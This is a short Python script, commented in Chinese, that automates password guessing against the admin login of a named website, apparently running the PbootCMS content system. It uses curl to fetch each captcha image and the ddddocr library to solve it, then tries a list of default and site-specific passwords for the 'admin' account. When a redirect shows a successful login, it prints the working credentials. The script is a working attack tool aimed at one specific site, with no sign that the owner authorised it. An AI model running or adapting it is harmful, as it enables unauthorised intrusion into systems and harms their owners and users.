"""ddddocr + 数字验证码识别 + 自动登录"""
import subprocess, ddddocr, time, re

BASE = "http://yurenmed.com"
COOKIE = "/tmp/yu_b2.txt"
PASSWORDS = ["admin", "admin123", "123456", "admin888", "yurenmed", "yuren123", "pboot", "qdyuren"]
OCR = ddddocr.DdddOcr(show_ad=False)

def get_captcha():
    subprocess.run(["rm", "-f", COOKIE])
    subprocess.run(["curl", "-sk", BASE, "-c", COOKIE, "-o", "/dev/null"], capture_output=True)
    subprocess.run(["curl", "-sk", BASE + "/core/code.php", "-b", COOKIE, "-c", COOKIE, 
                    "-o", "/tmp/yu_cap.png"], capture_output=True)
    with open("/tmp/yu_cap.png", "rb") as f:
        data = f.read()
    if len(data) < 100: return None
    result = OCR.classification(data).strip()
    # 只保留数字
    digits = "".join(c for c in result if c.isdigit())
    if len(digits) >= 4:
        return digits[:4]
    return result

def try_login(user, pwd, code):
    r = subprocess.run(["curl", "-sk", "-X", "POST", BASE + "/admin.php/index/login",
        "-d", f"username={user}&password={pwd}&checkcode={code}",
        "-b", COOKIE, "-c", COOKIE, "-D", "/tmp/yu_hdr.txt", "-o", "/dev/null"],
        capture_output=True, text=True, timeout=10)
    with open("/tmp/yu_hdr.txt") as f:
        hdrs = f.read()
    for line in hdrs.split("\n"):
        if line.lower().startswith("location:"):
            return line.strip()
    return ""

for pw in PASSWORDS:
    for attempt in range(5):
        code = get_captcha()
        if not code:
            print(f"  {pw}: captcha fail")
            continue
        loc = try_login("admin", pw, code)
        if "index/home" in loc or "index/index" in loc:
            print(f"\n[!] LOGIN OK: admin:{pw} code={code}")
            print(f"    {loc}")
            exit(0)
        # 显示原始识别结果
        raw = OCR.classification(open("/tmp/yu_cap.png","rb").read()).strip()
        if attempt == 0:
            print(f"  {pw}: raw={raw} num={code}")
        time.sleep(0.8)

print("\n全部失败")
